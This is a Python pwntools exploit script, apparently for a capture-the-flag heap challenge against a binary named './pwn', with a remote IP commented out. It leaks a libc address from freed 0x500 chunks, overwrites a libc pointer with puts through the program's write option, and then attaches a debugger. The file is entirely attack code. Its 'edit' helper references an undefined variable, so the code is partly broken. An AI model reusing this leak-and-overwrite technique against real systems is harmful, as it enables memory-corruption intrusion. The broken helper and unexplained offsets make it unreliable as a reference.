from pwn import *
context.log_level = "debug"
p=process("./pwn")
# p=remote('47.94.231.2',)
libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")

def choice(ch):
    p.sendlineafter("choice:",str(ch))

def add(size):
    choice(1)
    p.sendlineafter('size',str(size))

def free(idx):
    choice(2)
    p.sendlineafter('delete:',str(idx))

def edit(idx, payload):
    choice(3)
    p.sendlineafter('edit:',str(idx))
    p.sendafter('content',content)

def show(idx):
    choice(4)
    p.sendlineafter('show:',str(idx))

def env(ch):
    choice(5)
    p.sendlineafter('sad !',str(ch))

def write(addr1,payload):
    choice(6)
    p.sendafter('addr',p64(addr1))
    p.send(payload)

add(0x500)
add(0x500)
add(0x500)
add(0x500)
free(1)
free(3)
show(3)

libc_addr=u64(p.recvuntil(b"\x7f")[-6:].ljust(8,b"\x00"))-0x21ace0
success('libc_addr: '+hex(libc_addr))
write(libc_addr+0x21a118,p64(libc_addr+libc.sym['puts']))
env(2)
gdb.attach(p)
p.interactive()
